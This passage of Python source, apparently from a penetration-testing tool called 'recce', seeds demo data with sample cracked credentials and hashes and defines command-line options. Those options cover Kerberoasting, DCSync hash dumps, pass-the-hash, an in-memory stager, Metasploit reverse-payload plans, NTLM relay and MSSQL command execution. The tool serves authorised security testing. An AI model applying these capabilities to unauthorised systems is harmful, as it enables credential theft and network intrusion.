        h.exploits = demo_exploits.get(h.ip, [])
        from . import vulndb
        vulndb.assess_host_inplace(h)   # offline version->CVE findings
        h.enumerated = True
        # Confirmed footholds, so the map's access overlay has something to show.
        if h.ip == "10.0.20.6":
            h.access_gained = True
            h.access_detail = "vsftpd 2.3.4 backdoor (RCE) → shell"
        elif h.ip == "10.0.10.25":
            h.access_gained = True
            h.access_detail = "SMB admin via reused local Administrator hash"
        # Leave one host enumerated-only to show the Checklist's mixed states.
        if h.ip != "10.0.20.6":
            for p in h.ports:
                p.vuln_scanned = True
            h.db_scanned = True
            h.privesc_checked = True
        store.upsert_host(h)
    _demo_bloodhound(store)
    _demo_credentials(store)
    _generate_reports(store, paths, "DEMO engagement")
    store.close()
    print("[+] Demo reports generated from bundled sample scan.")
    return 0


def _demo_credentials(store: Store) -> None:
    """Seed a few captured credentials so the demo report's Credentials section
    renders. Secrets are masked in the shareable HTML; the workbook keeps the full
    values. Offline and deterministic."""
    from .models import Credential
    for c in (
        Credential(username="jsmith", secret="Summer2024!", kind="password",
                   domain="corp.local", source="cracked",
                   origin_ip="10.0.10.10",
                   notes="Kerberoast TGS cracked offline (hashcat -m 13100)."),
        Credential(username="Administrator", secret="aad3b435b51404eeaad3b435b51404ee",
                   kind="nthash", domain="", source="secretsdump",
                   origin_ip="10.0.20.6",
                   notes="Local SAM hash dumped after the vsftpd backdoor shell."),
        Credential(username="admin", secret="admin", kind="password",
                   domain="", source="default", origin_ip="10.0.20.5",
                   notes="Default web-app login accepted on 10.0.20.5:80."),
    ):
        try:
            store.add_credential(c)
        except (ValueError, OSError):
            pass


def _demo_bloodhound(store: Store) -> None:
    """Seed a small synthetic SharpHound collection so the demo report showcases the
    AD findings, attack paths and the tier-0 **AD architecture diagram**. Offline and
    deterministic — analysed exactly like a real collection."""
    from . import bloodhound as bh
    B = "S-1-5-21-4242-4242-4242"
    users = {"meta": {"type": "users"}, "data": [
        {"ObjectIdentifier": f"{B}-1104",
         "Properties": {"name": "JSMITH@CORP.LOCAL", "domain": "CORP.LOCAL",
                        "enabled": True, "hasspn": True,
                        "serviceprincipalnames": ["MSSQL/db01.corp.local"]}, "Aces": []},
        {"ObjectIdentifier": f"{B}-500",
         "Properties": {"name": "ADMINISTRATOR@CORP.LOCAL", "domain": "CORP.LOCAL",
                        "enabled": True}, "Aces": []},
    ]}
    computers = {"meta": {"type": "computers"}, "data": [
        {"ObjectIdentifier": f"{B}-1000",
         "Properties": {"name": "DC01.CORP.LOCAL", "domain": "CORP.LOCAL",
                        "enabled": True, "isdc": True}, "Aces": []},
    ]}
    groups = {"meta": {"type": "groups"}, "data": [
        {"ObjectIdentifier": f"{B}-512",
         "Properties": {"name": "DOMAIN ADMINS@CORP.LOCAL", "highvalue": True},
         "Members": [{"ObjectIdentifier": f"{B}-500", "ObjectType": "User"}], "Aces": []},
        {"ObjectIdentifier": f"{B}-516",
         "Properties": {"name": "DOMAIN CONTROLLERS@CORP.LOCAL", "highvalue": True},
         "Members": [{"ObjectIdentifier": f"{B}-1000", "ObjectType": "Computer"}], "Aces": []},
        {"ObjectIdentifier": f"{B}-513",
         "Properties": {"name": "DOMAIN USERS@CORP.LOCAL"},
         "Members": [{"ObjectIdentifier": f"{B}-1104", "ObjectType": "User"}], "Aces": []},
        {"ObjectIdentifier": f"{B}-1150",
         "Properties": {"name": "IT SUPPORT@CORP.LOCAL"},
         "Members": [{"ObjectIdentifier": f"{B}-1104", "ObjectType": "User"}],
         "Aces": [{"PrincipalSID": f"{B}-513", "RightName": "GenericWrite"}]},
    ]}
    domains = {"meta": {"type": "domains"}, "data": [
        {"ObjectIdentifier": B,
         "Properties": {"name": "CORP.LOCAL", "functionallevel": "2016",
                        "machineaccountquota": 10},
         "Trusts": [], "Aces": [
             {"PrincipalSID": f"{B}-1150", "RightName": "GetChanges"},
             {"PrincipalSID": f"{B}-1150", "RightName": "GetChangesAll"}]},
    ]}
    import tempfile as _tf
    try:
        with _tf.TemporaryDirectory() as d:
            for name, blob in (("users", users), ("computers", computers),
                               ("groups", groups), ("domains", domains)):
                with open(os.path.join(d, f"demo_{name}.json"), "w",
                          encoding="utf-8") as fh:
                    fh.write(json.dumps(blob))
            analysis = bh.analyze(d, owned={"JSMITH@CORP.LOCAL"})
        store.set_meta("ad_bloodhound", json.dumps(analysis))
    except (OSError, ValueError):
        pass


def _add_common(pp) -> None:
    # The two flags almost every run actually uses stay in the default section so
    # they're the first thing `-h` shows; the tuning knobs fold into a labelled
    # group below so the help reads as "here's the one flag you need, advanced
    # stuff is over there" instead of a flat wall.
    pp.add_argument("-o", "--output-dir", default="engagement",
                    help="output directory (default: ./engagement)")
    pp.add_argument("--title", default="Recce Engagement",
                    help="engagement title shown in reports")
    g = pp.add_argument_group("output & performance (optional)")
    g.add_argument("--profile", choices=list(scanner.PROFILES), default="standard",
                   help="scan depth preset (default: standard)")
    g.add_argument("--workers", type=int, default=6,
                   help="concurrent hosts to scan at once (default: 6)")
    g.add_argument("--refresh-every", type=int, default=10, metavar="N",
                   help="regenerate reports every N hosts (0 to disable; default 10)")
    g.add_argument("--host-timeout", type=int, metavar="MIN",
                   help="per-host time ceiling in minutes; nmap gives up on a "
                        "host after this and moves on (0 = no limit)")


def _add_creds(pp) -> None:
    # The three you reach for (user / pass / domain) are grouped together; the
    # privileged-account and LDAP-tuning flags fold into a second group so the
    # simple credentialed run (`-u USER -p PASS -d DOMAIN`) isn't buried.
    g = pp.add_argument_group("credentials")
    g.add_argument("-u", "--username",
                   help="user account for authenticated SMB/LDAP/WinRM. Domain-"
                        "qualified forms work too: 'CORP\\user', 'corp.local/user', "
                        "or 'user@corp.local' (splits out the domain, so -d is "
                        "optional then)")
    g.add_argument("-p", "--password", help="password for the user account")
    g.add_argument("-d", "--domain",
                   help="AD domain (e.g. corp.local) for authentication; overrides "
                        "any domain embedded in -u")
    a = pp.add_argument_group("privileged & LDAP (optional)")
    a.add_argument("--admin-user", dest="admin_username",
                   help="privileged/superuser account: runs the admin-only checks "
                        "(confirm local-admin reach, secretsdump hash dump)")
    a.add_argument("--admin-pass", dest="admin_password",
                   help="password for the privileged account")
    a.add_argument("--admin-domain", dest="admin_domain",
                   help="domain for the privileged account (defaults to -d)")
    a.add_argument("--ldap-enum", action="store_true",
                   help="credentialed LDAP enumeration of discovered DCs")
    a.add_argument("--ldap-anon", action="store_true", help="attempt anonymous LDAP bind")
    a.add_argument("--ldap-ssl", action="store_true", help="use LDAPS (636)")
    a.add_argument("--dc-ip", help="target this DC IP for LDAP instead of auto-detect")


def _add_discovery(pp) -> None:
    # `targets` plus the one or two flags a normal sweep uses (-Pn, --fast) sit up
    # top; the rest are scan internals you only reach for on a difficult network,
    # folded into a labelled group so `enum -h` opens with what you actually type.
    pp.add_argument("targets", nargs="+", help="CIDRs / ranges / IPs / hostnames, or @file")
    pp.add_argument("-Pn", "--no-discovery", action="store_true", dest="no_discovery",
                    help="skip the ping sweep and scan every target as if up (like "
                         "nmap -Pn). Use this when hosts block ping - common on "
                         "firewalled / Windows / AD networks.")
    pp.add_argument("--targets-up", action="store_true", dest="targets_up",
                    help="treat the target list as AUTHORITATIVE: implies -Pn, and "
                         "PRE-SEEDS every target (with its @file hostname) into the "
                         "report up front - so a slow / timed-out / failed scan can "
                         "never make a real host vanish ('no hosts'). Use with a "
                         "complete IP[,hostname] @file you trust.")
    pp.add_argument("--fast", action="store_true",
                    help="go fast: masscan network-wide sweep instead of per-host "
                         "nmap (and, in `scan`, top-signal vuln scripts only)")
    g = pp.add_argument_group("scan tuning (optional)")
    g.add_argument("--exclude", nargs="*", metavar="IP|CIDR|RANGE|@file",
                   help="hosts to keep OUT of scope: IPs / ranges / CIDRs, or @file "
                        "(one per line). Persisted to the engagement - once excluded, an "
                        "IP stays out of scope on every later phase/re-run.")
    g.add_argument("--masscan", action="store_true", help="use masscan for port sweep")
    g.add_argument("--all-ports", action="store_true",
                   help="force the full 65535-port TCP sweep, overriding the profile "
                        "and any --top-ports (the `standard`/`thorough` profiles already "
                        "do this; use it to force a full scan under `quick`/`--fast`)")
    g.add_argument("--top-ports", type=int,
                   help="scan only the top-N TCP ports (PARTIAL - faster but can miss a "
                        "service on an unusual port; recce prints a warning)")
    g.add_argument("--min-rate", type=int, help="nmap --min-rate override")
    g.add_argument("--max-retries", type=int, metavar="N",
                   help="nmap --max-retries on the port sweep (default 3; raise for "
                        "lossy links, lower for speed on clean ones)")
    g.add_argument("--no-verify", action="store_true",
                   help="skip the confirmation re-scan of hosts that come back with "
                        "0 open ports (faster; may trust a missed sweep)")
    g.add_argument("--verify-all", action="store_true",
                   help="also re-verify 0-port hosts under -Pn (not just discovered-"
                        "live ones) - catches every missed sweep, slower on dead-IP "
                        "scopes")
    g.add_argument("--no-udp-fallback", action="store_true",
                   help="skip the UDP liveness ping sent to a -Pn host that stays "
                        "silent on TCP (the ping tells a firewalled-but-alive host "
                        "apart from a dead one; needs root for raw UDP)")
    g.add_argument("--no-reconfirm", action="store_true",
                   help="after a partial ping sweep, DON'T re-probe the non-responders "
                        "with a fast -Pn top-ports scan (that re-probe recovers "
                        "firewalled hosts that block ping but answer a port scan)")
    g.add_argument("--reliable", action="store_true",
                   help="rate-limited / lossy network: drop the --min-rate floor, "
                        "retry dropped probes more, let nmap's congestion control "
                        "adapt (recce also switches to this automatically when it "
                        "sees nmap dropping probes)")
    g.add_argument("--no-ad", action="store_true", help="skip SMB/LDAP AD scripts")
    g.add_argument("--no-os", action="store_true", help="skip OS detection")
    g.add_argument("--version-all", action="store_true",
                   help="max-effort service detection (--version-all: every probe)")
    g.add_argument("--version-intensity", type=int, metavar="0-9",
                   help="nmap -sV probe intensity for service detection (default 8)")
    g.add_argument("--resume", action="store_true", help="skip hosts already in datastore")


def _add_vuln_opts(pp) -> None:
    g = pp.add_argument_group("vuln-scan tuning (optional)")
    g.add_argument("--aggressive", action="store_true",
                   help="run the full intrusive NSE 'vuln' category (can crash "
                        "fragile services); default is deep safe detection")
    g.add_argument("--offline", action="store_true",
                   help="airgapped: disable internet-dependent NSE (vulners)")
    g.add_argument("--no-searchsploit", action="store_true",
                   help="skip offline exploit mapping via searchsploit")
    g.add_argument("--no-probes", action="store_true",
                   help="skip the active stdlib probes (HTTP-header / TLS "
                        "enrichment + the service-detection banner grabs); the free "
                        "passive naming (servicefp mining + curated port map) stays on")
    g.add_argument("--udp-top", type=int, help="also scan top-N UDP ports (vulns phase)")
    g.add_argument("--no-udp", action="store_true",
                   help="skip the enum-phase basic-UDP sweep (DNS/SNMP/NTP/IKE/TFTP/"
                        "NetBIOS/...). The sweep needs root; it auto-skips otherwise.")


def build_arg_parser() -> argparse.ArgumentParser:
    from . import __version__
    p = argparse.ArgumentParser(
        prog="recce",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Phased enumeration & reporting for pentest engagements. "
                    "Scans fill an Excel workbook you check off as you go.",
        epilog=(
            "typical engagement:\n"
            "  1. recce doctor                     # verify this box\n"
            "  2. recce enum 10.0.0.0/24 -o eng    # discover + services\n"
            "  3. recce vulns -o eng               # vuln-scan open ports\n"
            "  4. recce sweep -o eng               # ALL credential-free deep modules\n"
            "  5. recce credsweep -u U -p P -d DOM -o eng   # once you have creds\n"
            "  6. recce status -o eng              # what's left; open eng/enumeration.xlsx\n\n"
            "targets: single IP, several IPs, range (10.0.0.10-40), CIDR, or @file.\n"
            "run 'recce <command> -h' for a command's options."
        ),
    )
    p.add_argument("-V", "--version", action="version",
                   version=f"recce {__version__}")
    sub = p.add_subparsers(dest="command", required=False, metavar="<command>")

    # Phase 1: fast enumeration -> sheet.
    e = sub.add_parser("enum", help="discover hosts, scan ports, ID services -> sheet")
    _add_discovery(e)
    _add_common(e)
    _add_creds(e)
    e.set_defaults(func=cmd_enum)

    # Phase 2: targeted vuln scanning of open ports already in the datastore.
    v = sub.add_parser("vulns", help="vuln-scan open ports found by `enum`")
    v.add_argument("targets", nargs="*",
                   help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(v)
    _add_vuln_opts(v)
    _add_creds(v)
    v.add_argument("--fast", action="store_true",
                   help="top-signal detection scripts only (skip the broad "
                        "'vuln and safe' net + deep enum) - much quicker on a /24, "
                        "shows live per-host progress + ETA")
    v.add_argument("--only", nargs="*", metavar="SVC",
                   help="only ports matching these service names / port numbers "
                        "(e.g. http smb 445)")
    v.add_argument("--unscanned", action="store_true",
                   help="only ports not already vuln-scanned")
    v.set_defaults(func=cmd_vulns)

    # Phase 2 (databases): DB-specific enumeration + vuln scan.
    dbp = sub.add_parser("db", help="database enumeration + vuln scan")
    dbp.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(dbp)
    dbp.add_argument("--aggressive", action="store_true",
                     help="intrusive DB checks (brute / xp_cmdshell / hash dump)")
    dbp.add_argument("--no-searchsploit", action="store_true")
    _add_creds(dbp)
    dbp.set_defaults(func=cmd_db)

    # Phase 3 (priv-esc): playbook + optional remote checks.
    pep = sub.add_parser("privesc", help="priv-esc playbook (Windows/Linux) + checks")
    pep.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(pep)
    pep.add_argument("--scan", action="store_true",
                     help="also run remote privesc NSE checks (smb-vuln-* etc.)")
    pep.add_argument("--aggressive", action="store_true",
                     help="include intrusive privesc NSE (may crash services)")
    _add_creds(pep)
    pep.set_defaults(func=cmd_privesc)

    # Phase 3 (credentialed): authenticated enum via netexec / impacket / ssh.
    cep = sub.add_parser("credenum",
                         help="credentialed enum (netexec/impacket/ssh) - needs creds")
    cep.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(cep)
    _add_creds(cep)
    cep.add_argument("--ssh-user", help="username for SSH local checks on Linux hosts")
    cep.add_argument("--ssh-pass", help="SSH password (needs sshpass on PATH)")
    cep.add_argument("--ssh-key", help="SSH private-key path for local checks")
    cep.add_argument("--aggressive", action="store_true",
                     help="also dump hashes with secretsdump (needs admin/DA)")
    cep.set_defaults(func=cmd_credenum)

    # deploy: push + run the read-only local-enum / priv-esc scripts across every
    # host we have creds for (SSH / WinRM / SMB), then fold the results in.
    dp = sub.add_parser("deploy",
                        help="mass local-enum + priv-esc: run recce-enum.sh/.ps1 on "
                             "every host you have creds for (SSH/WinRM/SMB)")
    dp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(dp)
    _add_creds(dp)
    dg = dp.add_argument_group("deploy options (optional)")
    dg.add_argument("--ssh-user", help="username for SSH (Linux hosts)")
    dg.add_argument("--ssh-pass", help="SSH password (needs sshpass on PATH)")
    dg.add_argument("--ssh-key", help="SSH private-key path")
    dg.add_argument("--hash", help="NTLM hash for pass-the-hash (SMB/WinRM), with -u")
    dg.add_argument("--stager", action="store_true",
                    help="Windows hosts fetch + run the script IN MEMORY from a "
                         "short-lived local HTTP server (no temp file, any size); "
                         "auto-falls-back to the push path if a host can't reach you")
    dg.add_argument("--lhost", help="your IP that targets route back to (for "
                                    "--stager; autodetected if omitted)")
    dg.add_argument("--no-validate", action="store_true",
                    help="skip the nxc credential precheck (select transport from "
                         "open ports only)")
    dg.add_argument("--timeout", type=int, metavar="SEC",
                    help="per-host remote-exec ceiling (default 300s)")
    dg.add_argument("--dry-run", action="store_true",
                    help="show the per-host transport plan and exit; run nothing")
    dp.set_defaults(func=cmd_deploy)

    # Reporting: per-finding Word write-ups from the template.
    wu = sub.add_parser("writeups",
                        help="generate one Word (.docx) write-up per finding")
    wu.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    wu.add_argument("-o", "--output-dir", default="engagement")
    wu.add_argument("--title", default="Recce Engagement",
                    help="engagement title shown on the combined report")
    wu.add_argument("--min-severity", default="low",
                    choices=["critical", "high", "medium", "low", "info"],
                    help="only findings at or above this severity (default: low - "
                         "excludes informational items; use 'info' to include them)")
    wu.add_argument("--include-potential", action="store_true",
                    help="also write up low-confidence, version-inferred 'potential' "
                         "findings (default: real findings only - those confirmed by "
                         "an actual check/observation)")
    wu.add_argument("--no-screenshots", action="store_true",
                    help="don't auto-capture web screenshots (add them in Word)")
    wu.add_argument("--no-combined", action="store_true",
                    help="skip the single combined findings_report.docx")
    wu.add_argument("--overwrite", action="store_true",
                    help="regenerate even where a write-up exists (loses tester edits)")
    wu.set_defaults(func=cmd_writeups)

    # Single-finding write-up, pre-filled with what's already looted/obtained.
    w1 = sub.add_parser("writeup",
                        help="write up ONE finding (pre-filled with looted/obtained "
                             "evidence); run with no selector to list findings")
    w1.add_argument("selector", nargs="?",
                    help="which finding: an F-id (F-007 / 7), a CVE, an IP or IP:port, "
                         "or a word from its title. Omit to list all findings.")
    w1.add_argument("-o", "--output-dir", default="engagement")
    w1.add_argument("--no-screenshots", action="store_true",
                    help="don't auto-capture web screenshots (add them in Word)")
    w1.add_argument("--overwrite", action="store_true",
                    help="regenerate even if this write-up already exists")
    w1.set_defaults(func=cmd_writeup)

    # Bridge: per-open-port enumeration commands from recce/scripts/.
    sv = sub.add_parser("services",
                        help="print the per-service enum command to run for every "
                             "open port recce found (bridges to recce/scripts/)")
    sv.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    sv.add_argument("-o", "--output-dir", default="engagement")
    sv.add_argument("-a", "--aggressive", action="store_true",
                    help="append -a to each command (enable the intrusive checks)")
    sv.set_defaults(func=cmd_services)

    # Deep web enumeration: fingerprint + non-intrusive checks on every HTTP(S) port.
    wb = sub.add_parser("web",
                        help="deep-enumerate web endpoints (tech fingerprint + "
                             "exposed .git/.env, actuator, methods, headers/TLS)")
    wb.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    wb.add_argument("-o", "--output-dir", default="engagement")
    wb.add_argument("--title", default="Recce Engagement")
    wb.add_argument("--workers", type=int, default=6,
                    help="concurrent hosts to scan at once (default: 6)")
    wb.add_argument("--no-active", action="store_true",
                    help="passive only: headers/TLS fingerprint, skip the path/method "
                         "probes (no requests beyond the root)")
    wb.add_argument("--cookie", help="Cookie header to scan as an authenticated user "
                                     "(e.g. 'session=abc123')")
    wb.add_argument("--header", action="append", metavar="K: V",
                    help="extra request header, repeatable (e.g. --header "
                         "'Authorization: Bearer <token>')")
    wb.add_argument("--screenshots", action="store_true",
                    help="also capture a headless-browser screenshot per endpoint "
                         "-> engagement/screenshots/ (needs chromium/firefox)")
    wb.add_argument("--creds", action="store_true",
                    help="also try a tiny documented default-credential list against "
                         "HTTP Basic-auth endpoints (lockout-aware, <=5 tries/endpoint)")
    wb.add_argument("--crawl", action="store_true",
                    help="same-origin crawl each site (authenticated with --cookie/"
                         "--header): discover pages/params/forms, then test discovered "
                         "GET params AND form fields for reflection/SSTI + SQL injection "
                         "(error/boolean), and flag cleartext-login / no-CSRF forms")
    wb.add_argument("--sqli-time", action="store_true",
                    help="with --crawl, also run the slower TIME-based blind SQLi probe "
                         "(sends deliberate DB sleeps; confirms by scaling the delay)")
    wb.add_argument("--fuzz-risky-forms", action="store_true",
                    help="with --crawl, ALSO submit forms whose action/fields signal a "
                         "side effect (delete / pay / send / post / ...). Off by default "
                         "- those forms are recorded, not submitted. File uploads are "
                         "never submitted. Use only on a throwaway/dev target.")
    _add_budget(wb)
    wb.set_defaults(func=cmd_web)

    # Per-finding exploitation plan: runnable artifacts driving existing tools.
    ep = sub.add_parser("exploitplan",
                        help="generate ready-to-run exploitation artifacts (msf .rc + "
                             "tool commands) for confirmed findings, params pre-filled")
    ep.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    ep.add_argument("-o", "--output-dir", default="engagement")
    ep.add_argument("--lhost", default="<LHOST>",
                    help="your callback IP for reverse payloads (fills LHOST in the "
                         ".rc files)")
    ep.add_argument("--lport", type=int, default=4444, help="callback port (default 4444)")
    ep.add_argument("--run", action="store_true",
                    help="arm the Metasploit launch lines (default: check-only, safe). "
                         "Use ONLY within your rules of engagement.")
    ep.set_defaults(func=cmd_exploitplan)

    # Proof / verification: is a flagged finding real or a false positive?
    pv = sub.add_parser("prove",
                        help="prove out findings - verdict (real / false-positive / "
                             "needs-PoC) + the exact safe check, per finding")
    pv.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    pv.add_argument("-o", "--output-dir", default="engagement")
    pv.add_argument("--title", default="Recce Engagement")
    pv.add_argument("--profile", choices=list(scanner.PROFILES), default="standard")
    pv.add_argument("--run", action="store_true",
                    help="also re-run the NON-INTRUSIVE detection NSE (SMB "
                         "security-mode / ms17-010) to move verdicts from LIKELY to "
                         "CONFIRMED / FALSE POSITIVE on real evidence")
    pv.set_defaults(func=cmd_prove)

    # Attack-path synthesis: chain confirmed findings into a staged path.
    ap = sub.add_parser("attackpath",
                        help="chain confirmed findings into a prioritised attack path "
                             "(foothold -> priv-esc -> creds -> lateral -> domain)")
    ap.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    ap.add_argument("-o", "--output-dir", default="engagement")
    ap.set_defaults(func=cmd_attackpath)

    # Credential stacking + spray planning.
    cd = sub.add_parser("creds",
                        help="stack captured credentials and build a netexec/impacket "
                             "spray plan across the discovered surface")
    cd.add_argument("targets", nargs="*",
                    help="restrict spray targets to these IPs / ranges / CIDRs / @file")
    cd.add_argument("-o", "--output-dir", default="engagement")
    cd.add_argument("--add", action="append", metavar="USER:SECRET",
                    help="add a captured credential: 'user:secret', "
                         "'DOMAIN\\user:secret' (a 32-hex secret => NT hash). Repeatable.")
    cd.add_argument("-u", "--user", help="add a credential: username")
    cd.add_argument("-p", "--pass", dest="password", help="add a credential: password")
    cd.add_argument("-H", "--hash", help="add a credential: NT hash (for pass-the-hash)")
    cd.add_argument("-d", "--domain", help="add a credential: AD domain (blank = local)")
    cd.add_argument("--plan", action="store_true",
                    help="build the spray plan (write users/passwords/hashes files "
                         "+ print the netexec/impacket commands)")
    cd.set_defaults(func=cmd_creds)

    # Convenience: enum + vulns in one shot.
    s = sub.add_parser("scan", help="run enum then vulns in one shot "
                                     "(add --deep for the full credential-free sweep)")
    _add_discovery(s)
    _add_common(s)
    _add_vuln_opts(s)
    _add_creds(s)
    s.add_argument("--deep", action="store_true",
                   help="one kickoff, whole credential-free mass surface across ALL "
                        "targets: discovery -> ports -> service/version -> vulns -> "
                        "every applicable deep module (web/smb/ftp/snmp/db/nfs/...). "
                        "Runs `sweep` right after enum+vulns.")
    s.add_argument("--skip", nargs="*", metavar="MOD",
                   help="with --deep: deep modules to skip (e.g. --skip mssql docker)")
    s.add_argument("--only-modules", nargs="*", metavar="MOD",
                   help="with --deep: run only these deep modules")
    s.set_defaults(func=cmd_scan)

    # One command instead of ~9: run every applicable credential-free deep module.
    sw = sub.add_parser("sweep",
                        help="run ALL applicable deep modules after enum in one shot "
                             "(web/smb/ftp/ldap/snmp/mongodb/redis/elasticsearch/rsync/"
                             "nfs/kerberos/docker/k8s/mssql)")
    sw.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(sw)
    _add_creds(sw)
    _add_vuln_opts(sw)
    sw.add_argument("--vulns", action="store_true",
                    help="also run the nmap NSE vuln scan (heavier; off by default)")
    sw.add_argument("--skip", nargs="*", metavar="MOD",
                    help="deep modules to skip (e.g. --skip mssql docker)")
    sw.add_argument("--only-modules", nargs="*", metavar="MOD",
                    help="run only these deep modules (e.g. --only-modules web smb)")
    sw.add_argument("--no-probe", action="store_true",
                    help="passive: fold what enum already found, don't send probes")
    sw.set_defaults(func=cmd_sweep)

    # The authenticated counterpart of `sweep`: needs creds, runs the credentialed
    # modules (credenum + authenticated ldap/smb/mssql/ftp) in one shot.
    csw = sub.add_parser("credsweep",
                         help="authenticated deep pass (needs -u/-p): run ALL "
                              "credentialed modules in one shot (credenum + "
                              "authenticated ldap/smb/mssql/ftp)")
    csw.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(csw)
    _add_creds(csw)
    csw.add_argument("--prove-write", action="store_true",
                     help="include the reversible writable-share / writable-dir proofs "
                          "(smb/ftp)")
    csw.add_argument("--skip", nargs="*", metavar="MOD",
                     help="credentialed modules to skip (e.g. --skip mssql)")
    csw.add_argument("--only-modules", nargs="*", metavar="MOD",
                     help="run only these modules (e.g. --only-modules credenum ldap)")
    csw.add_argument("--no-probe", action="store_true",
                     help="passive: fold what enum already found, don't send probes")
    csw.set_defaults(func=cmd_credsweep)

    # Fold on-target recce-enum.sh/.ps1 output into the Priv-Esc sheet.
    ing = sub.add_parser("ingest",
                         help="fold on-target recce-enum.sh/.ps1 output into Priv-Esc")
    ing.add_argument("loot", help="path to saved recce-enum output (-o / -OutFile file)")
    ing.add_argument("--host", help="attach findings to this IP (default: auto-resolve "
                                    "from the enum's own NET-IFACE interface IPs, then "
                                    "its hostname, else a 'local:<host>' entry)")
    ing.add_argument("-o", "--output-dir", default="engagement")
    ing.add_argument("--title", default="Recce Engagement")
    ing.set_defaults(func=cmd_ingest)

    # Import an existing nmap scan (XML / grepable) -> workbook, no scanning.
    imp = sub.add_parser("import",
                         help="import an existing nmap scan (-oX / -oG / -oN) -> sheet")
    imp.add_argument("files", nargs="+",
                     help="nmap .xml / .gnmap / .nmap file(s), a directory, or a glob")
    imp.add_argument("-o", "--output-dir", default="engagement")
    imp.add_argument("--title", default="Recce Engagement",
                     help="engagement title (only used when starting a fresh datastore)")
    imp.add_argument("--enum-only", action="store_true",
                     help="mark hosts enumerated only; don't auto-mark ports vuln-scanned "
                          "even if the imported scan ran NSE scripts")
    imp.add_argument("--searchsploit", action="store_true",
                     help="also map exploits via searchsploit (needs the tool)")
    imp.set_defaults(func=cmd_import)

    # Import SharpHound and/or Certipy (ADCS) output -> AD findings + paths to DA.
    bhp = sub.add_parser("ad", aliases=["bloodhound"],
                         help="import SharpHound + Certipy (ADCS) data -> AD vulns, "
                              "ESC findings + paths to Domain Admin")
    bhp.add_argument("paths", nargs="+",
                     help="SharpHound output (.zip / dir / .json) and/or a Certipy "
                          "find -json file - pass any mix; each is auto-detected")
    bhp.add_argument("-u", "--username",
                     help="your account - attack paths start from it, and every "
                          "command is pre-filled with it. Domain-qualified forms "
                          "('CORP\\alice', 'alice@corp.local') work too")
    bhp.add_argument("-p", "--password", help="password for your account")
    bhp.add_argument("-d", "--domain", help="AD domain (e.g. corp.local)")
    bhp.add_argument("--dc-ip", help="DC IP to fill into the staged commands")
    bhp.add_argument("--owned", action="append", metavar="USER[,USER...]",
                     help="override the path start set with these principal(s) "
                          "(repeatable / comma-separated)")
    bhp.add_argument("--creds", metavar="DOMAIN/user:secret",
                     help="alternative to -u/-p/-d; an NT hash if it's 32 hex chars")
    bhp.add_argument("--replace-ad", action="store_true",
                     help="clear previously-imported AD/ESC findings on the DC host "
                          "before folding this import, so remediated items disappear "
                          "(default: accumulate across imports)")
    bhp.add_argument("--roast", action="store_true",
                     help="LIVE: run impacket-GetUserSPNs -request to capture real "
                          "TGS-REP (Kerberoast) hashes (needs creds + --dc-ip)")
    bhp.add_argument("--asrep", action="store_true",
                     help="LIVE: run impacket-GetNPUsers -request to capture real "
                          "AS-REP hashes for pre-auth-disabled accounts")
    bhp.add_argument("--dcsync", action="store_true",
                     help="LIVE: run impacket-secretsdump -just-dc to replicate the "
                          "domain NTLM hashes (incl. krbtgt) - only if the account "
                          "holds replication rights")
    bhp.add_argument("--screenshots", action="store_true",
                     help="save terminal-output proof screenshots of the live "
                          "captures into engagement/screenshots/")
    bhp.add_argument("-o", "--output-dir", default="engagement")
    bhp.add_argument("--title", default="Recce Engagement")
    bhp.set_defaults(func=cmd_bloodhound)

    # MSSQL offensive enumeration + attack chain.
    ms = sub.add_parser("mssql",
                        help="MSSQL: pre-auth probes + (with creds) nxc access/priv "
                             "matrix + MSSQLPwner-style runbook & attack chain")
    ms.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "MSSQL hosts in the datastore)")
    ms.add_argument("-u", "--username",
                    help="your account - runs the nxc access/priv check and pre-fills "
                         "every command ('CORP\\alice' / 'alice@corp.local' work too)")
    ms.add_argument("-p", "--password", help="password for your account")
    ms.add_argument("-d", "--domain", help="AD domain (omit + --local-auth for a SQL login)")
    ms.add_argument("--local-auth", action="store_true",
                    help="SQL Server authentication (not Windows/domain)")
    ms.add_argument("--dc-ip", help="DC IP to fill into the generated commands")
    ms.add_argument("--lhost", help="your capture/relay IP for the UNC/relay commands")
    ms.add_argument("--relay", action="store_true",
                    help="actually trigger the SQL service account to authenticate to "
                         "--lhost (xp_dirtree) so your ntlmrelayx catches it")
    ms.add_argument("--data", action="store_true",
                    help="mine the databases: enumerate every table (+ row counts) and "
                         "find columns/tables with sensitive names across all databases")
    ms.add_argument("--perms", action="store_true",
                    help="per-database object-permission mining: guest-enabled databases "
                         "and objects public/guest can access")
    ms.add_argument("--screenshots", action="store_true",
                    help="capture terminal-style PROOF screenshots of executed actions "
                         "(RCE output, write-proof, data mining) for the walkthrough")
    ms.add_argument("--prove-write", action="store_true",
                    help="prove write + permission-modify impact REVERSIBLY (create a "
                         "table, modify a field, toggle a role; everything is reverted)")
    ms.add_argument("--exec", dest="exec_cmd", metavar="CMD",
                    help="execute an OS command on each reachable instance for effect "
                         "and capture the output (needs sysadmin)")
    ms.add_argument("--method", choices=["xp", "ole", "agent", "clr"], default="xp",
                    help="execution primitive for --exec: xp_cmdshell (default), OLE "
                         "Automation, SQL Agent job, or CLR (hands off to mssqlpwner)")
